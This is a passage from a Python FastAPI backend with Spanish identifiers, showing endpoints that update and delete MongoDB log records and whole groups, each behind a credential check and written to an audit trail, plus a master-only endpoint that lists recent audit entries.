                    grupo_origen=log_existente.get("grupo", "general"),
                    datos_previos={"id": str(log_existente["_id"]), "campos": log_existente.get("campos") or {}},
                    datos_nuevos=update_data,
                )
                return {"message": "Actualizado exitosamente"}
            except HTTPException:
                raise
            except Exception:
                raise HTTPException(status_code=400, detail="ID inválido")

    # ========================================================
    # ELIMINAR LOG
    # ========================================================
    @app.delete("/api/logs/{log_id}")
    async def api_eliminar_log(log_id: str, usuario: str = Form(...), password: str = Form(...)):
        async with db_semaphore:
            try:
                if not await validar_credenciales_internas(usuario, password):
                    raise HTTPException(status_code=401, detail="No autorizado")
                usuario_limpio = usuario.strip().lower()
                log_existente = await mongo.logs_usuarios.find_one({"_id": ObjectId(log_id)})
                if not log_existente:
                    raise HTTPException(status_code=404, detail="No encontrado")
                if usuario_limpio != AUTH_USERNAME.lower() and log_existente.get("grupo") != usuario_limpio:
                    raise HTTPException(status_code=403, detail="Sin permisos")
                await mongo.logs_usuarios.delete_one({"_id": ObjectId(log_id)})
                await add_background_task(
                    registrar_auditoria,
                    tipo_accion="ELIMINACION_INDIVIDUAL",
                    autor=usuario_limpio,
                    grupo_origen=log_existente.get("grupo", "general"),
                    datos_previos={"id": str(log_existente["_id"]), "usuario": log_existente.get("usuario")}
                )
                return {"message": "Eliminado exitosamente"}
            except HTTPException:
                raise
            except Exception:
                raise HTTPException(status_code=400, detail="ID inválido")

    # ========================================================
    # ELIMINAR GRUPO COMPLETO
    # ========================================================
    @app.delete("/api/grupo/{grupo_nombre}")
    async def api_eliminar_grupo(grupo_nombre: str, usuario: str = Form(...), password: str = Form(...)):
        async with db_semaphore:
            if not await validar_credenciales_internas(usuario, password):
                raise HTTPException(status_code=401, detail="No autorizado")
            usuario_limpio = usuario.strip().lower()
            grupo_limpio = grupo_nombre.strip().lower()
            if usuario_limpio != AUTH_USERNAME.lower() and grupo_limpio != usuario_limpio:
                raise HTTPException(status_code=403, detail="No puede eliminar otros grupos")
            result = await mongo.logs_usuarios.delete_many({"grupo": grupo_limpio})
            await add_background_task(
                registrar_auditoria,
                tipo_accion="ELIMINACION_GRUPO",
                autor=usuario_limpio,
                grupo_origen=grupo_limpio,
                datos_previos={"total": result.deleted_count}
            )
            return {"message": f"Se eliminaron {result.deleted_count} registros"}

    # ========================================================
    # AUDITORÍA MAESTRO
    # ========================================================
    @app.get("/api/maestro/auditoria")
    async def api_obtener_auditoria_maestro(usuario: str, password: str):
        async with db_semaphore:
            usuario_limpio = usuario.strip().lower()
            if usuario_limpio != AUTH_USERNAME.lower() or not hmac.compare_digest(password, AUTH_PASSWORD):
                raise HTTPException(status_code=403, detail="Acceso exclusivo al maestro.")
            cursor = mongo.auditoria_maestro.find().sort("fecha_auditoria", -1).limit(500)
            backups = await cursor.to_list(length=500)
            resultado = []
            for b in backups:
                resultado.append({
                    "id": str(b["_id"]),
                    "tipo_accion": b.get("tipo_accion"),
                    "autor": b.get("autor"),
                    "grupo_origen": b.get("grupo_origen"),
                    "datos_previos": b.get("datos_previos"),
                    "datos_nuevos": b.get("datos_nuevos"),
                    "fecha": b.get("fecha_auditoria").strftime("%Y-%m-%d %H:%M:%S")
                             if isinstance(b.get("fecha_auditoria"), datetime) else str(b.get("fecha_auditoria"))
                })
            return {"auditoria": resultado}

    return app


app = create_app()